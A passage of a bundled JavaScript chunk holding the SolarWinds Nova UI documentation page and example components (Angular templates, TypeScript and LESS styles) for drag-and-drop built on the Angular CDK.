strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The Angular CDK drag and drop module provides a way to easily and\n    declaratively create drag and drop interfaces.\n</p>\n<p>\n    To get started, import <code>DragDropModule</code> into the\n    <code>NgModule</code> where you want to use drag-and-drop features:\n</p>\n<nui-example-code language="typescript">{{\n    initialSetupCode\n}}</nui-example-code>\n<p>\n    For more details on the implementation of the @angular/cdk/drag-drop, check\n    the documentation\n    <a href="https://material.angular.io/cdk/drag-drop/overview" target="_blank"\n        >here</a\n    >\n</p>\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiDndModule</code>\n    </li>\n    <li>Angular CDK\'s <code>DragDropModule</code></li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    This example shows how easy it is to create a draggable element by adding\n    the <code>cdkDrag</code> directive on the DOM element we want to become\n    draggable. Since it can be dragged without any handle, hovering the element\n    will alter its state to both <code>nui-dnd-raised-state</code> and\n    <code>nui-dnd-hover-state</code>.\n</p>\n<nui-message [allowDismiss]="false" type="info">\n    <p>\n        In case you want to customize the styles for your draggable elements, it\n        may be helpful to know that all <code>cdkDrag</code> DOM elements have\n        the <code>.cdk-drag</code> CSS class applied to them.\n    </p>\n</nui-message>\n\n<nui-example-wrapper filenamePrefix="dnd-basic" exampleTitle="Drag & Drop">\n    <dnd-basic></dnd-basic>\n</nui-example-wrapper>\n\n<h2>Drag Axis Constraints</h2>\n<p>\n    By default, <code>cdkDrag</code> allows free movement in all directions. To\n    restrict dragging to a specific axis, you can set the\n    <code>cdkDragLockAxis</code> input on <code>cdkDrag</code> or the\n    <code>cdkDropListLockAxis</code> input on <code>cdkDropList</code>\n    to either "x" or "y".\n</p>\n<nui-example-wrapper\n    filenamePrefix="dnd-axis-constraints"\n    exampleTitle="Drag Axis Constraints"\n>\n    <dnd-axis-constraints></dnd-axis-constraints>\n</nui-example-wrapper>\n\n<h2>Disabled draggable items</h2>\n<p>\n    A collection of <code>cdkDrag</code> elements are usually placed inside a\n    <code>cdkDropList</code>.\n</p>\n<p>\n    To prevent an item from being dragged set the\n    <code>cdkDragDisabled</code> input on the <code>cdkDrag</code> element to\n    true:\n</p>\n<nui-message [allowDismiss]="false" type="info">\n    <p>\n        Disabled draggable DOM elements have the\n        <code>.cdk-drag-disabled</code> CSS class appended to them.\n    </p>\n    <p>\n        See the styles customization applied to the disabled draggable items in\n        the LESS source code tab in the source expander below for inspiration.\n    </p>\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="dnd-drag-disabled"\n    exampleTitle="Disabled draggable items"\n>\n    <dnd-drag-disabled></dnd-drag-disabled>\n</nui-example-wrapper>\n\n<h2>Custom Drag Preview</h2>\n<p>\n    It is possible to display custom preview content instead of cloning the\n    original element by specifying the <code>cdkDragPreview</code> directive.\n</p>\n<p>\n    The directive must be specified for each <code>cdkDrag</code> element that\n    we want to have preview content.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <p>\n        <strong>Important:</strong> In order for the\n        <code>cdkDragPreview</code> directive to work, it must be wrapped inside\n        a DOM element with the <code>cdkDropList</code> directive specified.\n    </p>\n    Take a look at the source of the following example to see how.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="dnd-drag-preview"\n    exampleTitle="Custom Drag Preview"\n>\n    <dnd-drag-preview></dnd-drag-preview>\n</nui-example-wrapper>\n\n<h2>Custom Drag Handle</h2>\n<p>\n    The handle by which an element can be dragged can be customized by\n    specifying the directive <code>cdkDragHandle</code> on the element we want\n    to become the handle.\n</p>\n<nui-example-wrapper\n    filenamePrefix="dnd-custom-handle"\n    exampleTitle="Custom Drag Handle"\n>\n    <dnd-custom-handle></dnd-custom-handle>\n</nui-example-wrapper>\n<p>\n    In the example above the handle is still displayed while dragging an\n    element; to hide the handle we just need to apply the properer styling on\n    the cloned preview element as shown below:\n    <nui-example-code language="css">{{\n        hideHandleWhileDragging\n    }}</nui-example-code>\n</p>\n\n<h2>Custom Placeholder</h2>\n<p>\n    While a <code>cdkDrag</code> element is being dragged, the Angular CDK will\n    create a placeholder element that will show the user where the dragged\n    element will be placed when it\'s dropped.\n</p>\n<p>\n    By default the placeholder is a clone of the element that is being dragged,\n    however you can replace it with a custom one using the\n    <code>*cdkDragPlaceholder</code> directive.\n</p>\n<nui-example-wrapper\n    filenamePrefix="dnd-drag-placeholder"\n    exampleTitle="Custom Placeholder"\n>\n    <dnd-drag-placeholder></dnd-drag-placeholder>\n</nui-example-wrapper>\n\n<h2>Dropzones Visualization</h2>\n<p>\n    A drag container is a collection of <code>cdkDrag</code> elements within a\n    <code>cdkDropList</code>. Decorating a drag container with the\n    <code\n        ><a href="../directives/DndDropTargetDirective.html" target="_parent"\n            >nuiDndDropTarget</a\n        ></code\n    >\n    directive defines a dropzone.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    In order use multiple drag containers, both sources and destinations must be\n    wrapped within a <code>cdkDropListGroup</code> directive.\n</nui-message>\n<p>\n    Once the user starts dragging an item from the source, the destination is\n    highlighted as an available destination dropzone; the\n    <code>nui-dnd-dropzone--active</code> CSS class is added to the dropzone\n    once dragging starts. The destination uses the\n    <code>nuiDndDropTarget</code> directive helper in order to inform the user\n    visually whether a dropzone will accept or reject a dragged item. In the\n    following example, all items are accepted except for <em>IBM</em>;\n</p>\n<nui-message [allowDismiss]="false" type="info">\n    The following CSS classes are added to the dropzone once the conditions are\n    met as described below:\n    <ul>\n        <li>- <code>nui-dnd-dropzone--active</code> - once dragging starts</li>\n        <li>\n            - <code>nui-dnd-dropzone--drop-allowed</code> - once the user is\n            over the dropzone and the dragged item is accepted\n        </li>\n        <li>\n            - <code>nui-dnd-dropzone--drop-not-allowed</code> - once the user is\n            over the dropzone and the dragged item is NOT accepted\n        </li>\n    </ul>\n</nui-message>\n<p>\n    To define acceptance conditions for a dropzone, the user can provide a\n    callback method to the <code>canBeDropped</code>\n    input.\n</p>\n<nui-example-wrapper filenamePrefix="dnd-dropzone" exampleTitle="Dropzones">\n    <dnd-dropzone></dnd-dropzone>\n</nui-example-wrapper>\n'},5841:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-dnd-docs",\n    templateUrl: "./dnd-docs.example.component.html",\n})\nexport class DndDocsExampleComponent {\n    public initialSetupCode = `\n// our module where we want to use drag-and-drop features\nimport { DragDropModule } from "@angular/cdk/drag-drop";\n\n@NgModule({\n    imports: [\n        DragDropModule,\n        // other modules that we might need\n    ],\n    declarations: [ /* our module declaration */],\n    exports:      [ /* our exports */ ],\n})\nexport class MyModule {}`.replace("\\r\\n", "<br/>"); // nice rendering\n\n    public hideHandleWhileDragging = `\n.dnd-drag-preview .drag-handle {\n    display: none;\n}\n    `;\n}\n'},7632:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    cdkDropList\n    class="draggable-container"\n    (cdkDropListDropped)="onItemDropped($event)"\n>\n    <div\n        *ngFor="let item of listItems"\n        class="draggable-item"\n        cdkDrag\n        [cdkDragDisabled]="!item.enabled"\n        cdkDragPreviewClass="dnd-drag-preview"\n    >\n        {{ item.title }} - {{ translatedStatus(item.enabled) }}\n    </div>\n</div>\n'},61128:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@box-width: 150px;\n@box-height: 50px;\n\n.draggable-container {\n    width: @box-width;\n    border-top: solid @nui-line-default @nui-color-line-default;\n}\n\n.item {\n    padding: @nui-space-md;\n    text-align: center;\n}\n\n.draggable-item:extend(.item) {\n    height: @box-height;\n    border: @dnd-item-border-width @nui-color-line-default solid;\n    border-top: none;\n\n    .transition(box-shadow 0.4s);\n\n    // apply style only for items that are enabled\n    &:hover:not(.cdk-drag-disabled) {\n        cursor: move;\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n    }\n\n    &.cdk-drag-disabled {\n        color: @nui-color-disabled;\n    }\n}\n\n.dnd-drag-preview:extend(.item, .nui-dnd-preview) {\n}\n'},62960:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkDragDrop, moveItemInArray } from "@angular/cdk/drag-drop";\nimport { Component } from "@angular/core";\n\nclass IListItem {\n    title: string;\n    enabled: boolean;\n}\n\n@Component({\n    selector: "dnd-drag-disabled",\n    templateUrl: "./dnd-drag-disabled-example.component.html",\n    styleUrls: ["./dnd-drag-disabled-example.component.less"],\n})\nexport class DndDragDisabledExampleComponent {\n    public listItems: IListItem[] = [\n        {\n            title: "Adobe",\n            enabled: true,\n        },\n        {\n            title: "IBM",\n            enabled: false,\n        },\n    ];\n\n    public onItemDropped(event: CdkDragDrop<IListItem[]>): void {\n        moveItemInArray(\n            this.listItems,\n            event.previousIndex,\n            event.currentIndex\n        );\n    }\n\n    public translatedStatus(enabled: boolean): string {\n        return enabled ? $localize`Enabled` : $localize`Disabled`;\n    }\n}\n'},60280:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    cdkDropList\n    class="draggable-container"\n    (cdkDropListDropped)="onItemDropped($event)"\n>\n    <div\n        cdkDrag\n        cdkDragPreviewClass="dnd-drag-preview"\n        class="draggable-item"\n        *ngFor="let item of listItems"\n    >\n        {{ item }}\n        <div class="draggable-placeholder" *cdkDragPlaceholder i18n>\n            Placeholder\n        </div>\n    </div>\n</div>\n'},64464:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@box-width: 150px;\n@box-height: 50px;\n@placeholder-border-width: @nui-line-default;\n\n.draggable-container {\n    width: @box-width;\n    border: solid @nui-line-default @nui-color-line-default;\n\n    :last-child {\n        border: none;\n    }\n}\n\n// generic item styling\n.item {\n    padding: @nui-space-md;\n    text-align: center;\n    box-sizing: border-box;\n    border-bottom: solid @nui-line-default @nui-color-line-default;\n}\n\n// drag & drop styling\n.draggable-item:extend(.item),\n.draggable-placeholder:extend(.item) {\n    height: @box-height;\n    .transition(box-shadow 0.4s);\n\n    &:hover {\n        cursor: move;\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n    }\n}\n\n.draggable-placeholder {\n    border: dashed @placeholder-border-width @nui-color-line-default;\n    background: @nui-color-bg-content-hover;\n    transition: transform 250ms cubic-bezier(0, 0, 0.2, 1);\n}\n\n.dnd-drag-preview:extend(.item, .nui-dnd-preview) {\n}\n'},8008:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkDragDrop, moveItemInArray } from "@angular/cdk/drag-drop";\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "dnd-drag-placeholder",\n    templateUrl: "./dnd-drag-placeholder-example.component.html",\n    styleUrls: ["./dnd-drag-placeholder-example.component.less"],\n})\nexport class DndDragPlaceholderExampleComponent {\n    public listItems: string[] = ["Adobe", "IBM", "Dell"];\n\n    public onItemDropped(event: CdkDragDrop<string[]>): void {\n        moveItemInArray(\n            this.listItems,\n            event.previousIndex,\n            event.currentIndex\n        );\n    }\n}\n'},77761:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    cdkDropList\n    class="draggable-container"\n    (cdkDropListDropped)="onItemDropped($event)"\n>\n    <div\n        cdkDrag\n        cdkDragPreviewClass="dnd-drag-preview"\n        class="draggable-item"\n        *ngFor="let item of listItems"\n    >\n        {{ item.title }}\n        <div *cdkDragPreview>\n            <p>This is the preview for {{ item.title }}</p>\n            <img\n                align="middle"\n                width="100"\n                [src]="item.preview"\n                [alt]="item.title"\n            />\n        </div>\n    </div>\n</div>\n'},70253:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@box-width: 150px;\n@box-height: 50px;\n\n.draggable-container {\n    width: @box-width;\n    border-top: solid @nui-line-default @nui-color-line-default;\n}\n\n.item {\n    padding: @nui-space-md;\n    text-align: center;\n}\n\n.draggable-item:extend(.item) {\n    height: @box-height;\n    border: solid @nui-line-default @nui-color-line-default;\n    border-top: none;\n    .transition(box-shadow 0.4s);\n\n    &:hover {\n        cursor: move;\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n    }\n}\n\n.dnd-drag-preview:extend(.item, .nui-dnd-preview) {\n}\n'},67821:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkDragDrop, moveItemInArray } from "@angular/cdk/drag-drop";\nimport { Component } from "@angular/core";\n\nimport { IRepeatItem } from "@nova-ui/bits";\n\ninterface IListItem extends IRepeatItem {\n    title: string;\n    preview: string;\n}\n\n@Component({\n    selector: "dnd-drag-preview",\n    templateUrl: "./dnd-drag-preview.example.component.html",\n    styleUrls: ["./dnd-drag-preview.example.component.less"],\n})\nexport class DndDragPreviewExampleComponent {\n    public listItems: IListItem[] = [\n        {\n            title: "Adobe",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Adobe_Systems_logo_and_wordmark.svg/524px-Adobe_Systems_logo_and_wordmark.svg.png",\n        },\n        {\n            title: "IBM",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/IBM_logo.svg/800px-IBM_logo.svg.png",\n        },\n        {\n            title: "Dell",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Dell_Logo.svg/300px-Dell_Logo.svg.png",\n        },\n    ];\n\n    public onItemDropped(event: CdkDragDrop<IListItem[]>): void {\n        moveItemInArray(\n            this.listItems,\n            event.previousIndex,\n            event.currentIndex\n        );\n    }\n}\n'},62992:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div cdkDropListGroup>\n    <div class="draggable-container pr-2" id="nui-demo-drop-list-1">\n        <h3>Companies</h3>\n        <div\n            cdkDropList\n            class="dragzone draggable-list"\n            [cdkDropListData]="companies"\n            [cdkDropListSortingDisabled]="true"\n            [cdkDropListEnterPredicate]="sourceAcceptsItem"\n            (cdkDropListDropped)="onItemDropped($event)"\n        >\n            <div class="items-container">\n                <div\n                    *ngFor="let company of companies"\n                    class="draggable-item"\n                    cdkDrag\n                    cdkDragPreviewClass="nui-dnd-preview"\n                    [cdkDragData]="company"\n                >\n                    <div\n                        class="draggable-placeholder"\n                        *cdkDragPlaceholder\n                    ></div>\n                    {{ company.name }}\n                </div>\n            </div>\n        </div>\n    </div>\n\n    <div class="draggable-container pl-2" id="nui-demo-drop-list-2">\n        <h3>Industries</h3>\n        <div\n            #dropTarget="nuiDndDropTarget"\n            id="cdk-drop-list"\n            *ngFor="let industry of industries"\n            class="dropzone draggable-list"\n            cdkDropList\n            [cdkDropListSortingDisabled]="true"\n            [cdkDropListData]="industry.companies"\n            nuiDndDropTarget\n            [canBeDropped]="destinationAcceptsItem"\n            (cdkDropListDropped)="onItemDropped($event)"\n        >\n            <div\n                class="title"\n                *ngIf="\n                    dropTarget.isDropZoneActive || !industry.companies?.length\n                "\n            >\n                {{ industry.name }}\n                \x3c!--\n                ShowDropZone: {{ dropTarget.showDropZone$ | async}}\n                CanDrop: {{ dropTarget.canDrop$ | async}}\n                IsDropZoneActive: {{dropTarget.isDropZoneActive}}\n                --\x3e\n            </div>\n            <div class="items-container">\n                <div\n                    *ngFor="let company of industry.companies"\n                    class="draggable-item"\n                    cdkDrag\n                    cdkDragPreviewClass="dropzone-preview"\n                    [cdkDragData]="company"\n                    [class.invisible]="dropTarget.isDropZoneActive"\n                >\n                    {{ company.name }}\n                </div>\n            </div>\n            <div *ngIf="dropTarget.isDropZoneActive" class="centered-overlay">\n                \x3c!-- highlight item placeholder--\x3e\n                <div *ngIf="(dropTarget.showDropZone$ | async) !== true">\n                    <nui-icon\n                        icon="plus"\n                        iconSize="medium"\n                        cssClass="drop-circle-permanent"\n                    ></nui-icon>\n                </div>\n\n                \x3c!-- accepted item placeholder--\x3e\n                <div *ngIf="dropTarget.canLastDragItemBeDropped$ | async">\n                    <nui-icon\n                        icon="plus"\n                        iconSize="medium"\n                        cssClass="drop-circle-allowed"\n                    ></nui-icon>\n                </div>\n\n                \x3c!-- reject item placeholder--\x3e\n                <div\n                    *ngIf="\n                        (dropTarget.canLastDragItemBeDropped$ | async) === false\n                    "\n                >\n                    <div class="centered-overlay text-nowrap text-special" i18n>\n                        Not allowed\n                    </div>\n                    <nui-icon\n                        icon="close"\n                        iconSize="medium"\n                        cssClass="drop-circle-not-allowed"\n                    ></nui-icon>\n                </div>\n            </div>\n        </div>\n    </div>\n</div>\n'},43336:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@min-height: 50px;\n\n.draggable-container {\n    width: 50%;\n    float: left;\n    min-height: (@min-height * 10);\n\n    .draggable-list {\n        border: solid @dnd-zone-border-width transparent;\n        position: relative;\n        padding: @nui-space-sm;\n        transition: all 0.3s ease-in-out;\n\n        .title {\n            position: absolute;\n        }\n        &.cdk-drop-list-dragging,\n        &.cdk-drop-list-receiving {\n            .draggable-item:hover {\n                box-shadow: none;\n                background-color: initial;\n            }\n        }\n    }\n}\n\n.dragzone {\n    .cdk-drop-list-dragging .draggable-item:not(.cdk-drag-placeholder) {\n        transition: transform 250ms cubic-bezier(0, 0, 0.2, 1);\n    }\n}\n\n.dropzone {\n    margin: 10px 0;\n    min-height: (2 * (@min-height + @nui-space-md + @dnd-zone-border-width));\n\n    .cdk-drag-placeholder,\n    .draggable-placeholder {\n        visibility: hidden;\n        min-height: @min-height - @dnd-zone-border-width;\n    }\n}\n\n.draggable-item,\n.draggable-placeholder,\n.dropzone-preview:extend(.nui-dnd-preview) {\n    min-height: @min-height + @dnd-item-border-width;\n    padding: @nui-space-md;\n    box-sizing: border-box;\n    text-align: center;\n    border: @dnd-item-border-width @nui-color-line-default solid;\n    .transition(box-shadow 0.4s);\n}\n\n.draggable-item {\n    border-bottom-color: transparent;\n\n    &:hover:not(.cdk-drag-placeholder) {\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n        cursor: move;\n        padding: @nui-space-md;\n    }\n}\n&.items-container :last-child {\n    border-bottom-color: @nui-color-line-default;\n}\n\n.draggable-placeholder {\n    min-height: @min-height + @dnd-zone-border-width - 1;\n    border-width: @dnd-zone-border-width;\n    border-style: dashed;\n    background: @nui-color-bg-content-hover;\n    transition: transform 250ms cubic-bezier(0, 0, 0.2, 1);\n}\n\n.cdk-drag-animating {\n    transition: transform 250ms cubic-bezier(0, 0, 0.2, 1);\n}\n\n.centered-overlay .text-special {\n    top: -25px;\n}\n'},84336:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    CdkDragDrop,\n    copyArrayItem,\n    moveItemInArray,\n    transferArrayItem,\n} from "@angular/cdk/drag-drop";\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\nclass Company {\n    name: string;\n    industries?: Industry[];\n}\n\nconst COMPANY_ADOBE: string = "Adobe";\nconst COMPANY_IBM: string = "IBM";\nconst COMPANY_DELL: string = "Dell";\n\nclass Industry {\n    name: string;\n    companies?: Company[];\n}\n\nconst INDUSTRY_HW: string = "Hardware";\nconst INDUSTRY_SW: string = "Software";\n\nconst availableCompanies: Company[] = [\n    { name: COMPANY_ADOBE, industries: [{ name: INDUSTRY_SW }] },\n    {\n        name: COMPANY_IBM,\n        industries: [{ name: INDUSTRY_SW }, { name: INDUSTRY_HW }],\n    },\n    {\n        name: COMPANY_DELL,\n        industries: [{ name: INDUSTRY_HW }, { name: INDUSTRY_SW }],\n    },\n];\n\n@Component({\n    selector: "dnd-dropzone-visual",\n    templateUrl: "./dnd-dropzone-visual-example.component.html",\n    styleUrls: ["./dnd-dropzone-visual-example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class DndDropzoneVisualExampleComponent {\n    public companies: Company[] = availableCompanies;\n\n    public industries: Industry[] = [\n        { name: INDUSTRY_HW, companies: [{ name: COMPANY_IBM }] },\n        { name: INDUSTRY_SW, companies: [] },\n    ];\n\n    // Note: Prevent user from putting back already displaced items\n    public sourceAcceptsItem(): boolean {\n        return false;\n    }\n\n    public destinationAcceptsItem(company: Company): boolean {\n        return company.name === "Adobe" || company.name === "Dell";\n    }\n\n    public onItemDropped(event: CdkDragDrop<Company[]>): void {\n        if (!this.destinationAcceptsItem(event.item.data)) {\n            return;\n        }\n        if (event.previousContainer === event.container) {\n            moveItemInArray(\n                event.container.data,\n                event.previousIndex,\n                event.currentIndex\n            );\n            return;\n        }\n        if (\n            event.previousContainer.element.nativeElement.classList.contains(\n                "dragzone"\n            )\n        ) {\n            copyArrayItem(\n                event.previousContainer.data,\n                event.container.data,\n                event.previousIndex,\n                event.currentIndex\n            );\n            return;\n        }\n        transferArrayItem(\n            event.previousContainer.data,\n            event.container.data,\n            event.previousIndex,\n            event.currentIndex\n        );\n    }\n}\n'},89637:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div cdkDropListGroup>\n    \x3c!-- source from where the items will be dragged --\x3e\n    <div class="draggable-container pr-2" id="nui-demo-drop-list-1">\n        <h3>Source</h3>\n        <div\n            cdkDropList\n            class="dragzone draggable-list"\n            [cdkDropListData]="sourceItems"\n            [cdkDropListSortingDisabled]="true"\n            [cdkDropListEnterPredicate]="sourceAcceptsItem"\n        >\n            \x3c!-- display list of items --\x3e\n            <div class="items-container">\n                <div\n                    *ngFor="let item of sourceItems"\n                    class="draggable-item"\n                    cdkDrag\n                    [cdkDragData]="item"\n                    cdkDragPreviewClass="nui-dnd-preview"\n                >\n                    {{ item }}\n                </div>\n            </div>\n        </div>\n    </div>\n\n    \x3c!-- destination dropzone where the items will be dropped --\x3e\n    <div class="draggable-container pl-2" id="nui-demo-drop-list-2">\n        <h3>Destination</h3>\n        <div\n            cdkDropList\n            class="dropzone draggable-list"\n            nuiDndDropTarget\n            #destinationTarget="nuiDndDropTarget"\n            [cdkDropListData]="destinationItems"\n            [canBeDropped]="destinationAcceptsItem"\n            (cdkDropListDropped)="onItemDropped($event)"\n        >\n            \x3c!-- display list of items --\x3e\n            <div class="items-container">\n                \x3c!-- make items invisible while a drag operation is in progress and dropzone is active--\x3e\n                <div\n                    *ngFor="let item of destinationItems"\n                    class="item"\n                    [class.invisible]="destinationTarget.isDropZoneActive"\n                >\n                    {{ item }}\n                </div>\n            </div>\n\n            \x3c!-- highlight dropzone area --\x3e\n            <ng-container\n                *ngTemplateOutlet="\n                    highlightDropzoneTemplate;\n                    context: { target: destinationTarget }\n                "\n            ></ng-container>\n        </div>\n    </div>\n</div>\n\n\x3c!-- template to highlight a dropzone and inform user about the drag operation outcome (accept item or not) --\x3e\n<ng-template #highlightDropzoneTemplate let-target="target">\n    <div *ngIf="target.isDropZoneActive" class="centered-overlay text-center">\n        \x3c!-- default state, highlight item placeholder when dragging starts --\x3e\n        <div *ngIf="(target.showDropZone$ | async) !== true">\n            \x3c!-- This is a drop zone area where you can drag your items --\x3e\n            <nui-icon\n                icon="plus"\n                iconSize="medium"\n                cssClass="drop-circle-permanent"\n            ></nui-icon>\n        </div>\n\n        \x3c!-- accepted item placeholder --\x3e\n        <div *ngIf="target.canLastDragItemBeDropped$ | async">\n            \x3c!-- The item currently dragged is accepted in this dropzone --\x3e\n            <nui-icon\n                icon="plus"\n                iconSize="medium"\n                cssClass="drop-circle-allowed"\n            ></nui-icon>\n        </div>\n\n        \x3c!-- reject item placeholder--\x3e\n        <div *ngIf="(target.canLastDragItemBeDropped$ | async) === false">\n            \x3c!-- The item currently dragged is NOT accepted in this dropzone --\x3e\n            <div class="centered-overlay text-nowrap text-special" i18n>\n                Not allowed\n            </div>\n            <nui-icon\n                icon="close"\n                iconSize="medium"\n                cssClass="drop-circle-not-allowed"\n            ></nui-icon>\n        </div>\n    </div>\n</ng-template>\n'},11673:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) 